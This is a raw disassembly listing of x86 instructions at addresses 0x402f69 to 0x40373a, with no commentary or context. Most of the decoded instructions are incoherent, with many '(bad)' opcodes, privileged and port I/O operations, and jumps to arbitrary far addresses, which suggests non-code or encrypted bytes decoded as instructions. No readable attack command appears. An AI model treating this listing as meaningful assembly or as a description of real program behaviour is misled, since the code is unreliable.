  402f69:	push   0xb986afd6
  402f6e:	in     eax,0x76
  402f70:	imul   esi,DWORD PTR [edi+0x73],0xffffffa3
  402f74:	gs pop ecx
  402f76:	(bad)  
  402f77:	jecxz  0x402f12
  402f79:	jl     0x402fdd
  402f7b:	arpl   WORD PTR ds:0x643c1068,dx
  402f81:	jns    0x402fe0
  402f83:	mov    al,0xc0
  402f85:	dec    ecx
  402f86:	pop    ss
  402f87:	push   0xd2e097a9
  402f8c:	mov    esi,0x9bfbc627
  402f91:	fs pop eax
  402f93:	je     0x402fbe
  402f95:	int3   
  402f96:	imul   ebx,DWORD PTR [esi],0x79
  402f99:	inc    esp
  402f9a:	shr    DWORD PTR [ebp+0x4293337f],cl
  402fa0:	cmp    ebx,DWORD PTR [ecx]
  402fa2:	mov    bh,ah
  402fa4:	cmp    bh,BYTE PTR [ebx-0x76]
  402fa7:	lock sbb ebx,ebx
  402faa:	pop    ebx
  402fab:	mov    edx,eax
  402fad:	jnp    0x402f80
  402faf:	jle    0x402fff
  402fb1:	loope  0x402fa4
  402fb3:	lock hlt 
  402fb5:	pop    eax
  402fb6:	data16 jle 0x40302b
  402fb9:	push   esi
  402fba:	sahf   
  402fbb:	stos   DWORD PTR es:[edi],eax
  402fbc:	mov    esp,0x1fe866e6
  402fc1:	cld    
  402fc2:	xor    esp,DWORD PTR [eax-0xf331bee]
  402fc8:	jno    0x402f53
  402fca:	xchg   esi,eax
  402fcb:	sub    DWORD PTR [esi-0x5e94cde9],esi
  402fd1:	aas    
  402fd2:	xchg   BYTE PTR [ebp+edx*8-0x6b],cl
  402fd6:	mov    ah,0xdf
  402fd8:	or     ah,BYTE PTR [eax]
  402fda:	stos   DWORD PTR es:[edi],eax
  402fdb:	repz loop 0x402ff6
  402fde:	cli    
  402fdf:	ds pop ds
  402fe1:	les    edi,FWORD PTR [ecx+0x46dc7568]
  402fe7:	aas    
  402fe8:	inc    eax
  402fe9:	pop    ebp
  402fea:	jmp    0x403068
  402fec:	xor    eax,0x3fef860f
  402ff1:	lods   al,BYTE PTR ds:[esi]
  402ff2:	jo     0x402f78
  402ff4:	jns    0x40304c
  402ff6:	xchg   BYTE PTR [esi],ah
  402ff8:	ins    BYTE PTR es:[edi],dx
  402ff9:	xchg   esi,eax
  402ffa:	adc    DWORD PTR [eax+edx*1+0x538cc56b],ecx
  403001:	pop    ss
  403002:	push   edx
  403003:	sbb    DWORD PTR [ecx-0x13a1b51f],edi
  403009:	fistp  WORD PTR [ecx-0xdf39e64]
  40300f:	or     BYTE PTR [edi-0xeb0c602],bl
  403015:	inc    esp
  403016:	ins    BYTE PTR es:[edi],dx
  403017:	ins    BYTE PTR es:[edi],dx
  403018:	mov    cl,0x8b
  40301a:	xchg   esp,edi
  40301c:	jnp    0x403082
  40301e:	pop    esi
  40301f:	sub    ecx,DWORD PTR [ecx]
  403021:	and    dl,BYTE PTR [edx]
  403023:	repz scas eax,DWORD PTR es:[edi]
  403025:	mov    BYTE PTR [ecx+edx*1],bl
  403028:	add    BYTE PTR [ebx],dh
  40302a:	(bad)
  40302d:	jge    0x40309d
  40302f:	bound  esp,QWORD PTR [edi-0x4d5bbbf]
  403035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403036:	push   ebx
  403037:	fidivr WORD PTR [edi+ebx*1]
  40303a:	push   cs
  40303b:	pop    esp
  40303c:	sti    
  40303d:	push   0x156512b3
  403042:	add    DWORD PTR [edx-0x53],esp
  403045:	push   edi
  403046:	sti    
  403047:	fwait
  403048:	arpl   si,ax
  40304a:	sub    eax,eax
  40304c:	mov    ch,0x70
  40304e:	ret    0xa514
  403051:	dec    edx
  403052:	test   eax,0x84f34393
  403057:	(bad)  
  403058:	and    al,0xea
  40305a:	mov    esi,0x718d5c7b
  40305f:	inc    esp
  403060:	jge    0x403036
  403062:	fst    st(4)
  403064:	cs inc eax
  403066:	push   0x9
  403068:	sbb    DWORD PTR [ecx+0x4a],esi
  40306b:	and    cl,BYTE PTR [ecx+0x7c]
  40306e:	das    
  40306f:	aad    0xa6
  403071:	push   esi
  403072:	sub    DWORD PTR [esi-0x470a1d4a],ebx
  403078:	or     cl,BYTE PTR [edx+0x5b]
  40307b:	cmp    dl,bl
  40307d:	mov    edx,DWORD PTR [esi-0x120f23ca]
  403083:	mov    bh,0x8a
  403085:	mov    dl,0x56
  403087:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403089:	(bad)  
  40308a:	bound  esi,QWORD PTR [edi-0x312105]
  403090:	retf   0x137a
  403093:	push   eax
  403094:	dec    edx
  403095:	jmp    DWORD PTR [edi]
  403097:	shrd   DWORD PTR [esi],edx,cl
  40309a:	faddp  st(3),st
  40309c:	cmc    
  40309d:	sub    edi,DWORD PTR [ecx-0x5659236a]
  4030a3:	dec    eax
  4030a4:	inc    edi
  4030a5:	sub    esp,DWORD PTR [esi+0x38]
  4030a8:	mov    DWORD PTR [esi+0x722420ae],esi
  4030ae:	mov    eax,0xfa4ef8bf
  4030b3:	mov    ah,dh
  4030b5:	inc    esp
  4030b6:	fld    TBYTE PTR [edx]
  4030b8:	iret   
  4030b9:	and    eax,0x4fba466a
  4030be:	inc    edi
  4030bf:	ror    DWORD PTR [ebx+edi*1],0x5a
  4030c3:	lock arpl WORD PTR [ecx+0x768fe6b7],sp
  4030ca:	addr16 cmp eax,eax
  4030cd:	or     eax,0xe6711c0e
  4030d2:	jns    0x4030c1
  4030d4:	dec    BYTE PTR [eax]
  4030d6:	mov    WORD PTR [edx+0x4d],ss
  4030d9:	sahf   
  4030da:	xchg   edi,eax
  4030db:	rcl    DWORD PTR [edx],0x85
  4030de:	mov    gs,edi
  4030e0:	adc    edi,esp
  4030e2:	jecxz  0x40308d
  4030e4:	xchg   esp,eax
  4030e5:	loopne 0x4030bb
  4030e7:	or     dl,BYTE PTR [ebx]
  4030e9:	mov    bh,0x11
  4030eb:	pop    ss
  4030ec:	imul   edi,DWORD PTR [esi-0x60],0xbf940dea
  4030f3:	cmp    ebp,DWORD PTR [ebx-0x20]
  4030f6:	inc    esi
  4030f7:	push   ecx
  4030f8:	and    edx,DWORD PTR [ecx-0x2129e41c]
  4030fe:	push   es
  4030ff:	and    BYTE PTR [eax-0x68],ch
  403102:	dec    ebx
  403103:	xchg   ebp,eax
  403104:	outs   dx,DWORD PTR ds:[esi]
  403105:	fcmovnb st,st(6)
  403107:	jo     0x4030f2
  403109:	or     DWORD PTR [edi+0x6693d93d],eax
  40310f:	mov    esi,?
  403111:	dec    eax
  403112:	sbb    BYTE PTR [edi-0x19],0x8c
  403116:	inc    edx
  403117:	popa   
  403118:	pop    edi
  403119:	push   esi
  40311a:	xchg   esp,eax
  40311b:	push   ds
  40311c:	les    edi,FWORD PTR gs:[edx]
  40311f:	pop    eax
  403120:	out    dx,al
  403121:	xchg   ebp,eax
  403122:	xchg   ebp,eax
  403123:	aas    
  403124:	dec    edx
  403125:	cmp    BYTE PTR [esi+0x6e],bl
  403128:	lods   al,BYTE PTR ds:[esi]
  403129:	pop    edi
  40312a:	sub    BYTE PTR [eax-0x1f],0xdb
  40312e:	and    BYTE PTR [eax-0x68],ah
  403131:	das    
  403132:	xor    eax,0x47f8bafc
  403137:	js     0x403195
  403139:	pop    ebx
  40313a:	adc    eax,0x6a876ad
  40313f:	cmp    BYTE PTR [ecx],0xee
  403142:	sub    edx,ecx
  403144:	push   edx
  403145:	cld    
  403146:	lods   eax,DWORD PTR ds:[esi]
  403147:	enter  0x523a,0x63
  40314b:	std    
  40314c:	xchg   DWORD PTR [ecx+ecx*1+0x141e591],ebp
  403153:	xchg   ebx,eax
  403154:	jge    0x4030fa
  403156:	push   es
  403157:	aad    0xe0
  403159:	mov    ds:0x8139dfe7,al
  40315e:	pop    ebx
  40315f:	adc    al,0x62
  403161:	(bad)  
  403162:	and    al,0xc9
  403164:	adc    ch,BYTE PTR [edi]
  403166:	ja     0x40314a
  403168:	inc    esp
  403169:	ret    0x3ecc
  40316c:	fnstenv [ecx]
  40316e:	cmp    dh,0x30
  403171:	jp     0x40316f
  403173:	shl    BYTE PTR [esi+0x3a],1
  403176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403177:	in     al,dx
  403178:	jg     0x403151
  40317a:	retf   0x727d
  40317d:	cld    
  40317e:	sbb    BYTE PTR [ebx],ah
  403180:	mov    ah,dl
  403182:	sub    al,0x6e
  403184:	loopne 0x40314a
  403186:	test   DWORD PTR [ecx],0x3fd0eb1f
  40318c:	mov    esi,0x6bd451c6
  403191:	imul   edi,DWORD PTR [edi],0x16fa65ef
  403197:	and    eax,0x78f60f0c
  40319c:	jmp    0x4031e7
  40319e:	stos   DWORD PTR es:[edi],eax
  40319f:	outs   dx,BYTE PTR ds:[esi]
  4031a0:	add    eax,0xe1acce52
  4031a5:	retf   0xc23a
  4031a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031a9:	div    DWORD PTR [eax+eiz*8]
  4031ac:	add    BYTE PTR [ebp+0x1ccf62da],0x6c
  4031b3:	mov    dl,BYTE PTR [ebx+0x32]
  4031b6:	enter  0xd103,0xbf
  4031ba:	add    ebp,ebx
  4031bc:	jae    0x40319d
  4031be:	inc    eax
  4031bf:	call   0x5402:0xa2e7240a
  4031c6:	adc    dl,BYTE PTR [edx-0x10]
  4031c9:	(bad)  
  4031cb:	in     eax,0xb4
  4031cd:	inc    esi
  4031ce:	cmp    BYTE PTR [esi+0x67e47477],0xb1
  4031d5:	jno    0x40318b
  4031d7:	hlt    
  4031d8:	out    dx,eax
  4031d9:	adc    esi,DWORD PTR [ebx]
  4031db:	fs pushf 
  4031dd:	pop    es
  4031de:	jmp    0x40318b
  4031e0:	mov    bl,0xce
  4031e2:	test   DWORD PTR [esp+ecx*8+0x3c],ecx
  4031e6:	bound  esi,QWORD PTR [eax]
  4031e8:	push   edi
  4031e9:	test   DWORD PTR [ebp-0x3],esp
  4031ec:	scas   al,BYTE PTR es:[edi]
  4031ed:	jmp    0xa3e4:0x615f3f4d
  4031f4:	xchg   esi,eax
  4031f5:	mov    al,ds:0xe61dae44
  4031fa:	inc    ecx
  4031fb:	pop    ebx
  4031fd:	sbb    al,0xee
  4031ff:	cdq    
  403200:	pop    DWORD PTR ds:0xda571977
  403206:	jecxz  0x403260
  403208:	pop    ss
  403209:	imul   ecx,edx,0x1cfc629e
  40320f:	or     eax,0x13589e2d
  403214:	mov    edx,0x7fed12cc
  403219:	xchg   esi,eax
  40321a:	rcr    DWORD PTR [ebx+edx*4+0x0],1
  40321e:	mov    edi,0xadc614b1
  403223:	scas   eax,DWORD PTR es:[edi]
  403224:	aad    0xa0
  403226:	pop    esi
  403227:	and    al,0x93
  403229:	ins    BYTE PTR es:[edi],dx
  40322a:	jge    0x40325b
  40322c:	sub    dl,BYTE PTR [edi]
  40322e:	cmp    al,0xdb
  403230:	mov    WORD PTR [ebp+0x12],fs
  403233:	pop    ebx
  403234:	je     0x403261
  403236:	xchg   BYTE PTR [edx],ch
  403238:	shr    DWORD PTR [ecx-0x3b],1
  40323b:	into   
  40323c:	cmc    
  40323d:	in     al,0x52
  40323f:	push   esp
  403240:	push   0x5a
  403242:	xor    ch,BYTE PTR [ebx]
  403244:	pop    ss
  403245:	es mov ebp,0x80421b32
  40324b:	xlat   BYTE PTR ds:[ebx]
  40324c:	push   eax
  40324d:	pop    esi
  40324e:	mov    edx,0xba9aec57
  403253:	or     ah,dl
  403255:	mov    edx,0x246609f4
  40325a:	xor    ebp,esp
  40325c:	and    ebp,DWORD PTR [ebx+eax*2+0x7a6c4dd2]
  403263:	in     al,dx
  403264:	retf   0x618b
  403267:	idiv   bh
  403269:	adc    al,0xf2
  40326b:	sbb    al,0xa6
  40326d:	xor    dl,BYTE PTR [edi+esi*4+0x455f0637]
  403274:	push   0xffffffba
  403276:	jnp    0x4032ec
  403278:	jns    0x403228
  40327a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40327b:	(bad)  
  40327c:	out    dx,eax
  40327d:	mov    edx,0xf9e3ed8f
  403282:	xor    al,0x9c
  403284:	jmp    0x403245
  403286:	dec    eax
  403287:	mul    BYTE PTR [esi+eiz*2+0x7a]
  40328b:	push   ss
  40328c:	xchg   BYTE PTR [ebp+0x10],al
  40328f:	xchg   edx,eax
  403290:	mov    dl,0xf3
  403292:	es mov ebx,edi
  403295:	(bad)  
  403296:	call   0x4ece2b5c
  40329b:	mov    DWORD PTR [ecx-0x37a71521],esi
  4032a1:	repz jge 0x40324b
  4032a4:	sub    DWORD PTR [ebp-0x72e52ab1],edx
  4032aa:	and    BYTE PTR [ebp-0x33],bl
  4032ad:	(bad)  
  4032ae:	mov    WORD PTR [esi+0x44],cs
  4032b1:	lds    ebx,FWORD PTR gs:[ebp-0x624a99da]
  4032b8:	jae    0x4032d2
  4032ba:	je     0x403318
  4032bc:	jl     0x403280
  4032be:	dec    esp
  4032bf:	jmp    0x8ce6:0xf91d61cd
  4032c6:	sub    BYTE PTR [ecx-0x3bb397cd],al
  4032cc:	inc    eax
  4032cd:	mov    dh,0x38
  4032cf:	cmp    edx,DWORD PTR [edi]
  4032d1:	inc    ecx
  4032d2:	mul    BYTE PTR [esi-0x4d]
  4032d5:	and    DWORD PTR [edx],ecx
  4032d7:	ins    DWORD PTR es:[edi],dx
  4032d8:	sti    
  4032d9:	stos   DWORD PTR es:[edi],eax
  4032da:	cmp    ebp,DWORD PTR [ebp+0x4e]
  4032dd:	retf   
  4032de:	mov    BYTE PTR [ebx+ebx*2],dh
  4032e1:	fucomi st,st(6)
  4032e3:	jle    0x4032d0
  4032e5:	adc    esp,DWORD PTR [ebx+0x16]
  4032e8:	jb     0x40334a
  4032ea:	jg     0x403316
  4032ec:	dec    ebp
  4032ed:	xchg   WORD PTR [eax+0x59d16488],dx
  4032f4:	mov    ebx,0xa1ed6b7d
  4032f9:	lds    edi,FWORD PTR [ecx+ebx*1]
  4032fc:	shl    DWORD PTR [eax+0x61],1
  4032ff:	xchg   ebp,edi
  403301:	mov    dl,BYTE PTR [eax]
  403303:	mov    edi,0x77c93e52
  403308:	and    ah,ah
  40330a:	cmp    edi,DWORD PTR [ebp+0x4f50fb44]
  403310:	daa    
  403311:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403313:	xchg   dh,bl
  403315:	lods   al,BYTE PTR ds:[esi]
  403316:	mov    esp,ebp
  403318:	mov    esp,0xdbd2adac
  40331d:	aam    0x7e
  40331f:	(bad)  
  403320:	jae    0x403328
  403322:	ret    
  403323:	adc    eax,0x7fbce70
  403328:	sbb    eax,0xe79a7c73
  40332d:	out    0x3f,al
  40332f:	mov    eax,0xc09f58b6
  403334:	mov    WORD PTR [eax-0x7],?
  403337:	dec    ecx
  403338:	enter  0x5cd,0xba
  40333c:	icebp  
  40333d:	mov    ds:0x54bebfe6,al
  403342:	mov    BYTE PTR [edi-0x6235d572],dl
  403348:	fdivr  st(4),st
  40334a:	rol    edx,0x4f
  40334d:	xchg   DWORD PTR [eax],edx
  40334f:	(bad)  
  403350:	test   DWORD PTR [edx+edi*4+0x29],0xe8767d3f
  403358:	(bad)
  40335b:	stos   BYTE PTR es:[edi],al
  40335c:	jge    0x403359
  40335e:	loope  0x403314
  403360:	aas    
  403361:	mov    BYTE PTR [esi+0x44eab78f],cl
  403367:	fwait
  403368:	lea    edi,[esi-0x2d]
  40336b:	stos   BYTE PTR es:[edi],al
  40336c:	push   0xfffffffb
  40336e:	cmp    esi,DWORD PTR ds:0x5c79ec0c
  403374:	fisub  WORD PTR [edi]
  403376:	adc    BYTE PTR [ebp-0x4e2f729],0xb1
  40337d:	js     0x4033a3
  40337f:	pop    ebp
  403380:	aad    0xdf
  403382:	push   esi
  403383:	ja     0x403379
  403385:	cmp    eax,0x9189628f
  40338a:	cmp    esp,DWORD PTR [edx]
  40338c:	fisub  WORD PTR [ebx-0x5b]
  40338f:	int3   
  403390:	jbe    0x4033c1
  403392:	push   ss
  403393:	push   ecx
  403394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403395:	mov    esp,cr4
  403398:	xchg   esi,eax
  403399:	jmp    0x2e0f74c7
  40339e:	mov    esi,0xb20f6d0
  4033a3:	adc    dl,BYTE PTR [ecx+0x3c11bbd6]
  4033a9:	adc    BYTE PTR [esi+0x317c25c],dh
  4033af:	aad    0x70
  4033b1:	push   cs
  4033b2:	adc    esp,ecx
  4033b4:	bound  esi,QWORD PTR [ecx+0x2e]
  4033b7:	mov    ds:0x7f2751cf,eax
  4033bc:	jae    0x403383
  4033be:	fimul  WORD PTR [esi]
  4033c0:	loop   0x4033ed
  4033c2:	test   BYTE PTR [edi],bl
  4033c4:	cmp    DWORD PTR [ebx],ebp
  4033c6:	loopne 0x40334f
  4033c8:	or     al,0xa6
  4033ca:	mov    al,al
  4033cc:	and    ebx,esp
  4033ce:	or     edi,ecx
  4033d0:	xlat   BYTE PTR ds:[ebx]
  4033d1:	fdivr  st(4),st
  4033d3:	fadd   QWORD PTR [eax-0x22]
  4033d6:	les    ebp,FWORD PTR [ebp-0x467068ff]
  4033dc:	out    0x27,eax
  4033de:	retf   
  4033df:	jle    0x40339a
  4033e1:	cmp    al,0xda
  4033e3:	push   ds
  4033e4:	push   edx
  4033e5:	pop    esp
  4033e6:	push   ebp
  4033e7:	dec    edx
  4033e8:	ja     0x403429
  4033ea:	das    
  4033eb:	pop    ds
  4033ec:	push   esp
  4033ed:	clc    
  4033ee:	addr16 push ebp
  4033f0:	gs stos BYTE PTR es:[edi],al
  4033f2:	dec    ecx
  4033f3:	out    0x2,al
  4033f5:	cmp    ebp,esi
  4033f7:	enter  0xadcb,0xb9
  4033fb:	mov    bh,0x98
  4033fd:	bound  ebx,QWORD PTR [ebp+0x4a8ffa7b]
  403403:	xor    DWORD PTR [ecx-0x73702c60],ecx
  403409:	mov    BYTE PTR [eax+0x4a10d81c],bl
  40340f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403410:	push   ss
  403411:	sbb    BYTE PTR [esi],al
  403413:	stos   DWORD PTR es:[edi],eax
  403414:	ins    BYTE PTR es:[edi],dx
  403415:	mov    bh,0xe3
  403417:	push   cs
  403418:	(bad)  
  403419:	add    dl,dh
  40341b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40341c:	xchg   BYTE PTR ds:0x377c360b,cl
  403422:	mov    BYTE PTR [esi-0x17760f95],bl
  403428:	jo     0x403412
  40342a:	sub    al,0xb9
  40342c:	hlt    
  40342d:	in     eax,dx
  40342e:	sbb    eax,0xd59d7a59
  403433:	pop    ebp
  403434:	and    ah,BYTE PTR [edi-0x45c4a804]
  40343a:	pop    ecx
  40343b:	rol    eax,1
  40343d:	adc    eax,0xb831af2c
  403442:	mov    dh,0xf4
  403444:	cmp    DWORD PTR [ecx-0x72473856],ebx
  40344a:	ret    
  40344b:	inc    ebp
  40344c:	lds    esp,FWORD PTR [eax+0x3]
  40344f:	sahf   
  403450:	lea    edi,[esi-0x66]
  403453:	mov    edi,0xb0d7b58c
  403458:	lock not BYTE PTR [edx+0x51]
  40345c:	cs adc eax,0x20ba57ac
  403462:	or     cl,BYTE PTR [edx-0x74e8c575]
  403468:	shl    DWORD PTR [ebp-0xfa59962],0x29
  40346f:	ins    BYTE PTR es:[edi],dx
  403470:	aam    0x64
  403472:	icebp  
  403473:	call   0x11e4f25e
  403478:	int    0xf4
  40347a:	xchg   ecx,eax
  40347b:	mov    esi,DWORD PTR [edx+0xe]
  40347e:	in     eax,0xdf
  403480:	ret    0x5fae
  403483:	jg     0x4034b3
  403485:	jb     0x40347d
  403487:	push   0x1d
  403489:	rcr    ah,1
  40348b:	xchg   esi,eax
  40348c:	cmp    eax,0xfddb88bb
  403491:	add    DWORD PTR [edx+0x2e],edx
  403494:	mov    ah,0xbd
  403496:	(bad)  
  403497:	fiadd  DWORD PTR gs:[edx-0xc]
  40349b:	ds int 0xea
  40349e:	mov    ds:0x9bcc8c6a,al
  4034a3:	enter  0x9cdb,0x6b
  4034a7:	add    cl,BYTE PTR [eax+0x4c269634]
  4034ad:	mov    cl,0xf7
  4034af:	mov    bl,BYTE PTR [eax]
  4034b1:	pop    ds
  4034b2:	cmc    
  4034b3:	jp     0x403498
  4034b5:	enter  0x57f3,0xd
  4034b9:	popf   
  4034ba:	enter  0x6bed,0x1e
  4034be:	inc    edx
  4034bf:	inc    edx
  4034c0:	or     DWORD PTR [esi+0x5a],edx
  4034c3:	cmp    ebp,DWORD PTR [ecx]
  4034c5:	cmp    ch,bh
  4034c7:	in     eax,0xb2
  4034c9:	sti    
  4034ca:	dec    edx
  4034cb:	and    DWORD PTR [ebx-0x5b39f2a],esi
  4034d1:	cmc    
  4034d2:	pop    edx
  4034d3:	and    DWORD PTR [ebp+0x123b31c8],ebx
  4034d9:	in     eax,dx
  4034da:	outs   dx,BYTE PTR ds:[esi]
  4034db:	fldenv [ebx]
  4034dd:	sbb    eax,0x669d6892
  4034e2:	stos   BYTE PTR es:[edi],al
  4034e3:	cmp    edi,DWORD PTR [ecx-0x62]
  4034e6:	test   eax,0x6ceb4f18
  4034eb:	xor    DWORD PTR [edi-0x62],ecx
  4034ee:	or     eax,esp
  4034f0:	das    
  4034f1:	mov    edi,cs
  4034f3:	adc    cl,cl
  4034f5:	inc    edx
  4034f6:	mov    ah,0x6c
  4034f8:	icebp  
  4034f9:	test   ah,dh
  4034fb:	dec    ecx
  4034fc:	rcl    ebp,0x7f
  4034ff:	sub    BYTE PTR [esi-0x2f],0xae
  403503:	push   esi
  403504:	icebp  
  403505:	loope  0x403512
  403507:	push   0xffffffa4
  403509:	ja     0x403507
  40350b:	jmp    0x4034d2
  40350d:	mov    ecx,0x19a6b159
  403512:	outs   dx,BYTE PTR ds:[esi]
  403513:	repz and bl,BYTE PTR [ecx-0x5b]
  403517:	sub    eax,0x7623f4ae
  40351c:	dec    esi
  40351d:	sbb    eax,0x428e829f
  403522:	cld    
  403523:	fisttp WORD PTR [ecx]
  403525:	xor    BYTE PTR [ecx+0xc167634],0xbb
  40352c:	jnp    0x4034e3
  40352e:	out    0x58,eax
  403530:	push   ebp
  403531:	stos   DWORD PTR es:[edi],eax
  403532:	out    dx,al
  403533:	xlat   BYTE PTR ds:[ebx]
  403534:	mov    esi,0xfdff9653
  403539:	les    eax,FWORD PTR [ebp-0x251a2ddd]
  40353f:	sbb    BYTE PTR [edi+0x6d],bl
  403542:	in     eax,0x53
  403544:	push   cs
  403545:	add    DWORD PTR [ebx-0xb],0x1f
  403549:	vprotw xmm12,xmm6,[eax+0x71da3451]
  403552:	xchg   esp,eax
  403553:	push   cs
  403554:	call   0xc674ebd4
  403559:	mov    ds:0xd2b0b16f,eax
  40355e:	pop    edx
  40355f:	or     dl,BYTE PTR [ecx-0x301e70fa]
  403565:	xchg   esp,eax
  403566:	jmp    0x443c4e65
  40356b:	gs sbb al,0x26
  40356e:	sar    ebx,cl
  403570:	aam    0x62
  403572:	jl     0x40354a
  403574:	jns    0x4035dd
  403576:	shl    DWORD PTR [ebp+0x6],0xc1
  40357a:	into   
  40357b:	in     al,dx
  40357c:	mov    ?,WORD PTR [edx+eiz*4]
  40357f:	jo     0x403566
  403581:	and    BYTE PTR [ecx],al
  403583:	mov    esp,0x62ee37fc
  403588:	or     bl,0x84
  40358b:	iret   
  40358c:	push   ecx
  40358d:	addr16 clc 
  40358f:	inc    esi
  403590:	xchg   DWORD PTR [ebp+0x71],edx
  403593:	jb     0x40352b
  403595:	pop    edi
  403596:	mov    al,ds:0x97507f39
  40359c:	sbb    eax,0x20c06814
  4035a1:	mov    edx,0xf179727e
  4035a6:	inc    eax
  4035a8:	dec    edx
  4035a9:	sub    ecx,ecx
  4035ab:	mov    ch,0xb9
  4035ad:	xor    cl,BYTE PTR [esi+0xb]
  4035b0:	sub    ecx,DWORD PTR [esi-0x458c6b7c]
  4035b6:	xchg   ch,bh
  4035b8:	mov    al,ds:0x3f976478
  4035bd:	push   ss
  4035be:	outs   dx,BYTE PTR ds:[esi]
  4035bf:	dec    ebx
  4035c0:	mov    eax,esi
  4035c2:	stos   BYTE PTR es:[edi],al
  4035c3:	push   0xc3e86397
  4035c8:	cmp    BYTE PTR [eax+eiz*1+0x1],ch
  4035cc:	(bad)
  4035cf:	pop    edx
  4035d0:	pop    esi
  4035d1:	pushf  
  4035d2:	call   0xe3ba:0x9360447f
  4035d9:	cmp    DWORD PTR [edi],eax
  4035db:	repz test DWORD PTR [edx-0x1404f94d],eax
  4035e2:	push   edx
  4035e3:	inc    esi
  4035e4:	rol    BYTE PTR [esi+0x9a9165b],0x8e
  4035eb:	fist   DWORD PTR ds:0x4804f44e
  4035f1:	xor    BYTE PTR [eax+0x55],cl
  4035f4:	dec    eax
  4035f5:	loope  0x403629
  4035f7:	mov    bh,0xbe
  4035f9:	mov    cl,0xb3
  4035fb:	xlat   BYTE PTR ds:[ebx]
  4035fc:	into   
  4035fd:	or     DWORD PTR ds:0xc9e6befc,edi
  403603:	out    0x83,al
  403605:	mov    BYTE PTR [ebx],ah
  403607:	xor    al,0x3d
  403609:	test   eax,0xc0dabf25
  40360e:	jmp    0x75ce7c6e
  403613:	cld    
  403614:	xchg   esp,eax
  403615:	stc    
  403616:	jne    0x40365d
  403618:	sahf   
  403619:	mov    bl,0xb3
  40361b:	in     al,0x25
  40361d:	cld    
  40361e:	xchg   esp,eax
  40361f:	mov    dh,0x58
  403621:	in     eax,0xfd
  403623:	rcl    BYTE PTR [esi-0x4c6a6baa],cl
  403629:	sbb    esp,DWORD PTR ds:0x2efab5ed
  40362f:	dec    DWORD PTR [esi]
  403631:	icebp  
  403632:	sub    al,0xcd
  403634:	das    
  403635:	pop    eax
  403636:	pop    esi
  403637:	cmp    esp,DWORD PTR [eax-0x69]
  40363a:	mov    ebp,0xeac82543
  40363f:	and    esi,edx
  403641:	in     eax,dx
  403642:	xor    ebx,0x2
  403645:	mov    ebp,0x89606ea9
  40364a:	sub    bl,BYTE PTR [ebx+eax*4+0x2]
  40364e:	iret   
  40364f:	or     ah,BYTE PTR [esi+0x1e]
  403652:	shl    dl,1
  403654:	inc    esi
  403655:	clc    
  403656:	rol    ah,0xa3
  403659:	popf   
  40365a:	mov    bl,0x3b
  40365c:	dec    edi
  40365d:	cmc    
  40365e:	jecxz  0x403614
  403660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403661:	jnp    0x403662
  403663:	sub    BYTE PTR [ebx],bl
  403665:	push   ecx
  403666:	cli    
  403667:	push   ebx
  403668:	in     al,dx
  403669:	ins    DWORD PTR es:[edi],dx
  40366a:	in     eax,0x9f
  40366c:	mov    ch,0xb6
  40366e:	mov    bh,BYTE PTR [edi-0x50cd1a71]
  403674:	mov    eax,0xab305bc4
  403679:	cmp    ebx,DWORD PTR [eax]
  40367b:	arpl   dx,cx
  40367d:	or     edx,esi
  40367f:	outs   dx,BYTE PTR ds:[esi]
  403680:	mov    bl,0xdc
  403682:	enter  0x2a77,0x44
  403686:	in     eax,0x82
  403688:	int3   
  403689:	pop    eax
  40368a:	pop    edi
  40368b:	jp     0x403664
  40368d:	fisubr WORD PTR [ebx-0x2]
  403690:	pop    DWORD PTR [eax]
  403692:	xchg   esi,eax
  403693:	rcl    DWORD PTR [ebp-0xd88bd10],1
  403699:	xor    ecx,DWORD PTR [ebp-0x48b8bc9d]
  40369f:	popa   
  4036a0:	xchg   ebp,eax
  4036a1:	jb     0x4036d4
  4036a3:	in     eax,dx
  4036a4:	push   eax
  4036a5:	jbe    0x4036b6
  4036a7:	sub    BYTE PTR [edi+edx*8-0x7d2d48b0],0xa0
  4036af:	stos   BYTE PTR es:[edi],al
  4036b0:	ds jns 0x40371f
  4036b3:	jge    0x40370d
  4036b5:	test   al,0x76
  4036b7:	sbb    DWORD PTR [esi+esi*1],esi
  4036ba:	and    BYTE PTR [ecx],dh
  4036bc:	adc    al,0x80
  4036be:	sub    BYTE PTR [ecx+0x20b95873],dh
  4036c4:	mov    al,ds:0x357418fe
  4036c9:	mov    ds:0x38456235,al
  4036ce:	lock dec edi
  4036d0:	inc    eax
  4036d1:	cwde   
  4036d2:	cli    
  4036d3:	test   al,0xf4
  4036d5:	rol    BYTE PTR [edi-0x5a1a8f1f],0x25
  4036dc:	loope  0x403683
  4036de:	enter  0x4efa,0xc0
  4036e2:	sub    bl,ah
  4036e4:	pop    ebp
  4036e5:	ret    0x5da7
  4036e8:	int    0x89
  4036ea:	mov    al,0xa3
  4036ec:	sbb    al,BYTE PTR [ecx-0x3f842a00]
  4036f2:	leave  
  4036f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036f4:	stc    
  4036f5:	or     dh,BYTE PTR [eax+eiz*1-0x4fa4652a]
  4036fc:	pop    ecx
  4036fd:	shl    DWORD PTR [ebx-0x33139249],1
  403703:	push   ebx
  403704:	mov    eax,0xf3adffe7
  403709:	daa    
  40370a:	(bad)  
  40370b:	adc    BYTE PTR [ecx-0x77dbdaf0],dl
  403711:	je     0x4036e8
  403713:	fdivr  DWORD PTR [ecx]
  403715:	or     BYTE PTR [ecx+0x1b0bf8ec],al
  40371b:	jge    0x403794
  40371d:	fisubr WORD PTR [ecx+0x2d]
  403720:	in     eax,0x6
  403722:	push   ebp
  403723:	cmp    esi,esp
  403725:	adc    eax,0xf84e59b2
  40372a:	(bad)  
  40372b:	pop    edx
  40372c:	(bad)  
  40372d:	outs   dx,DWORD PTR ds:[esi]
  40372e:	sahf   
  40372f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403730:	in     al,dx
  403731:	mov    al,0x66
  403733:	call   0xd207432c
  403738:	sbb    BYTE PTR [edi],dh
  40373a:	fwait
